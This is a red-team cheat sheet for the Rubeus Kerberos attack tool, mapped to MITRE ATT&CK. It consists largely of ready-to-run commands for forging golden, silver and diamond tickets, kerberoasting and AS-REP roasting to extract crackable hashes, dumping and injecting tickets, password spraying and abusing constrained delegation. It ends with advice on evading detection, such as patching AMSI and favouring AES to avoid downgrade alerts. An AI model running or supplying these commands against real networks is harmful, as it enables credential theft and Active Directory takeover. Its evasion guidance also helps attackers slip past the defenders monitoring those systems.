
> [!abstract] Rubeus Cheat Sheet
> **Rubeus** is a C# toolset for raw Kerberos interaction and abuses. It is heavily adapted from Kekeo and MakeMeEnterpriseAdmin. Unlike Mimikatz which touches LSASS memory directly (heavy EDR detection), Rubeus uses official Windows APIs (like `LsaCallAuthenticationPackage`) to manipulate tickets, making it stealthier and often not requiring elevation.
> 
> **MITRE ATT&CK Mapping:**
> - **T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket**
> - **T1558.002 - Steal or Forge Kerberos Tickets: Silver Ticket**
> - **T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting**
> - **T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting**
> - **T1550.003 - Use Alternate Authentication Material: Pass the Ticket**

## Command Summary

> [!info] Quick Reference Table
> | Command | Description | Requires Elevation? |
> | :--- | :--- | :--- |
> | `asktgt` | Request a TGT from a hash/password/cert | No (unless `/createnetonly`) |
> | `asktgs` | Request a Service Ticket (TGS) from a TGT | No |
> | `s4u` | Constrained/RBCD delegation abuse (S4U2Self/S4U2Proxy) | No |
> | `golden` / `silver` / `diamond` | Forge Kerberos tickets | No |
> | `ptt` | Pass-the-Ticket (inject ticket into current session) | No |
> | `purge` | Purge Kerberos tickets from current session | No |
> | `describe` | Parse and describe a .kirbi or base64 ticket | No |
> | `dump` / `triage` / `klist` | Extract tickets from memory | Yes (to dump all users) |
> | `tgtdeleg` | Get usable TGT for current user without elevation | No |
> | `kerberoast` | Request TGS for SPN accounts (hash extraction) | No |
> | `asreproast` | Request AS-REP for accounts without preauth | No |
> | `monitor` / `harvest` | Monitor for new TGTs (Unconstrained Delegation) | Yes |

---

## Ticket Requests & Renewals

> [!example]+ `asktgt` (Request TGT)
> Requesting a Ticket Granting Ticket using a password, NTLM hash, or AES key.
> ```powershell
> # Using RC4 (NTLM) hash and injecting it into the current session (/ptt)
> Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt
> 
> # Using AES256 hash, OPSEC safe (mimics genuine traffic), starting a hidden sacrificial process
> Rubeus.exe asktgt /user:dfm.a /domain:testlab.local /aes256:e27b2e7b39f59c3738813a9ba8c20cd5... /opsec /createnetonly:C:\Windows\System32\cmd.exe
> 
> # Using a PFX certificate (PKINIT)
> Rubeus.exe asktgt /user:harmj0y /domain:rubeus.ghostpack.local /certificate:C:\temp\leaked.pfx /getcredentials
> ```

> [!example]+ `asktgs` (Request Service Ticket)
> Requesting a TGS for specific SPNs using an existing TGT.
> ```powershell
> # Requesting tickets for LDAP and CIFS
> Rubeus.exe asktgs /ticket:doIFmjCCBZagAw... /service:LDAP/primary.testlab.local,cifs/primary.testlab.local /ptt
> 
> # Force RC4 encryption for a ticket (for Kerberoasting/Downgrade)
> Rubeus.exe asktgs /ticket:doIFmjCCB... /service:roast/me /enctype:rc4
> ```

> [!tip]+ `brute` / `spray` & `preauthscan`
> ```powershell
> # Kerberos-based password bruteforcing
> Rubeus.exe brute /password:Password123!! /noticket
> 
> # Scan for accounts that do not require pre-authentication
> Rubeus.exe preauthscan /users:uns.txt /domain:semperis.lab
> ```

---

## Ticket Forgery

> [!danger]+ Golden & Silver Tickets
> Forge tickets offline using stolen KRBTGT (Golden) or Service Account (Silver) hashes.
> ```powershell
> # Golden Ticket using LDAP to gather PAC info automatically
> Rubeus.exe golden /aes256:6a8941dcb801e... /user:harmj0y /ldap /ptt
> 
> # Golden Ticket with explicit parameters
> Rubeus.exe golden /aes256:6a8941dcb801e... /user:harmj0y /id:1106 /pgid:513 /domain:rubeus.ghostpack.local /sid:S-1-5-21-3237111427-... /groups:513 /dc:PDC1.rubeus.ghostpack.local /ptt
> 
> # Silver Ticket (e.g., CIFS) using service RC4 hash, signed with KRBTGT AES key
> Rubeus.exe silver /service:cifs/SQL1.rubeus.ghostpack.local /rc4:f74b07eb77caa52b... /ldap /user:ccob /krbkey:6a8941dcb801e... /krbenctype:aes256 /ptt
> ```

> [!warning]+ Diamond Tickets
> Instead of forging a ticket from scratch, Diamond Tickets request a legitimate TGT and modify its PAC (e.g., adding Enterprise Admins SID) using the KRBTGT key. This is stealthier than a Golden Ticket.
> ```powershell
> # Diamond ticket using a password/hash
> Rubeus.exe diamond /krbkey:3111b43b220d2f4eb8e68fe7be1179ce... /user:loki /password:Mischief$ /enctype:aes /domain:marvel.local /dc:earth-dc.marvel.local /ticketuser:thor /ticketuserid:1104 /groups:512
> 
> # Diamond ticket using the tgtdeleg trick (no creds needed, just KRBTGT hash)
> Rubeus.exe diamond /krbkey:3111b43b220d2f4eb8e68fe7be1179ce... /tgtdeleg /ticketuser:thor /ticketuserid:1104 /groups:512
> ```

---

## Ticket Management & Extraction

> [!tip]+ `ptt` & `purge`
> Manage tickets in the current logon session.
> ```powershell
> # Inject base64 ticket into current session
> Rubeus.exe ptt /ticket:doIFmjCCBZagAw...
> 
> # Inject ticket into a specific LUID (requires elevation)
> Rubeus.exe ptt /luid:0x474722b /ticket:doIFmjCCBZagAw...
> 
> # Purge all tickets
> Rubeus.exe purge
> ```

> [!example]+ `dump` & `triage`
> Extract tickets from memory. `triage` gives a clean table view; `dump` extracts the `.kirbi` base64 data.
> ```powershell
> # Triage all tickets on the system (requires elevation for all users)
> Rubeus.exe triage
> 
> # Dump all TGTs from a specific LUID
> Rubeus.exe dump /luid:0x47869cc
> 
> # Dump only TGTs across the system
> Rubeus.exe dump /service:krbtgt
> ```

> [!bug]+ `tgtdeleg` (No Elevation Needed)
> Uses the Kerberos GSS-API to retrieve a usable TGT for the current user without touching LSASS or needing admin rights.
> ```powershell
> Rubeus.exe tgtdeleg
> ```

> [!warning]+ `monitor` & `harvest`
> Monitor for new TGTs (useful on servers with Unconstrained Delegation).
> ```powershell
> # Monitor for new TGTs every 10 seconds for a specific user
> Rubeus.exe monitor /targetuser:DC$ /interval:10 /nowrap
> 
> # Harvest with auto-renewal
> Rubeus.exe harvest /interval:30 /nowrap
> ```

---

## Roasting

> [!danger]+ `kerberoast`
> Extract crackable hashes for accounts with SPNs. Uses `KerberosRequestorSecurityToken.GetRequest()` by default.
> ```powershell
> # Basic Kerberoasting (uses highest supported encryption)
> Rubeus.exe kerberoast
> 
> # OPSEC Kerberoasting: Uses tgtdeleg, filters out AES accounts, requests only RC4
> Rubeus.exe kerberoast /rc4opsec /nowrap
> 
> # Kerberoasting using a stolen TGT
> Rubeus.exe kerberoast /ticket:doIFujCCBbagAw... /nowrap
> 
> # Save hashes directly to a file
> Rubeus.exe kerberoast /outfile:C:\Temp\hashes.txt
> ```

> [!danger]+ `asreproast`
> Extract crackable hashes for accounts that do not require Kerberos pre-authentication.
> ```powershell
> # Roast all accounts in the current domain
> Rubeus.exe asreproast /nowrap
> 
> # Roast a specific OU and output in Hashcat format
> Rubeus.exe asreproast /ou:OU=TestOU3,DC=testlab,DC=local /format:hashcat /outfile:C:\Temp\hashes.txt
> ```

---

## Constrained Delegation Abuse

> [!example]+ `s4u` (S4U2Self & S4U2Proxy)
> Abuse accounts configured with `TrustedToAuthForDelegation` to impersonate users (e.g., Administrator) on target services.
> ```powershell
> # Full chain: Ask TGT -> S4U2Self -> S4U2Proxy -> Substitute service (CIFS) -> Inject
> Rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:dfm.a /msdsspn:"ldap/PRIMARY.testlab.local" /altservice:cifs /ptt
> 
> # RBCD (Resource-Based Constrained Delegation) Abuse
> # If you have write privileges to a target machine, use its machine account hash to impersonate an admin
> Rubeus.exe s4u /user:PCmachine$ /aes256:<AES256_KEY> /msdsspn:HOST/viclab-dc.sinabndr.local /altservice:HTTP /impersonateuser:administrator /ptt
> ```

---

## Miscellaneous Utilities

> [!tip]+ `createnetonly`
> Creates a hidden sacrificial process (Logon Type 9) to inject tickets into without stomping on your current session's TGT.
> ```powershell
> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show /ticket:ticket.kirbi
> ```

> [!tip]+ `describe`
> Parse a `.kirbi` or base64 ticket. Extracts Kerberoast hashes if the ticket is RC4-encrypted.
> ```powershell
> Rubeus.exe describe /ticket:doIFmjCCBZagAw...
> # Decrypt PAC with service key
> Rubeus.exe describe /servicekey:6a8941dcb801e... /ticket:doIFaDCCBWSgAw...
> ```

> [!tip]+ `tgssub` (sname Substitution)
> Substitute the service name in an existing TGS. Useful for changing an LDAP ticket to a CIFS ticket after S4U abuse.
> ```powershell
> Rubeus.exe tgssub /ticket:doIGPjCCBjqgAw... /altservice:cifs /ptt
> ```

> [!tip]+ `hash`
> Calculate Kerberos hashes (RC4, AES128, AES256, DES) from a plaintext password.
> ```powershell
> Rubeus.exe hash /password:Password123! /user:harmj0y /domain:testlab.local
> ```

---

## OPSEC & Compilation Notes

> [!warning] Red Team OPSEC Considerations
> - **AMSI / ETW:** Rubeus is a .NET assembly. Running it through PowerShell (e.g., `execute-assembly` in Cobalt Strike) may trigger AMSI or ETW logging. Consider patching AMSI or using Invisi-Shell.
> - **RC4 vs AES:** Using RC4 (`/rc4:`) in a modern domain (2008+) causes an encryption downgrade. This is detectable at the network level and DC event logs. Always prefer AES256 (`/aes256:`) with the `/opsec` flag if stealth is required.
> - **LSASS Access:** `dump` and `harvest` require elevation and access to LSASS, which may trigger EDR. For extracting the current user's TGT without touching LSASS, use `tgtdeleg`.

> [!info] Compilation
> Rubeus is not distributed as a pre-compiled binary to avoid brittle signatures. It must be compiled using Visual Studio. It targets .NET 3.5 by default but can be retargeted to .NET 4.x if needed. It can also be compiled as a Class Library (DLL) and executed in-memory via PowerShell using `[Reflection.Assembly]::Load()`.


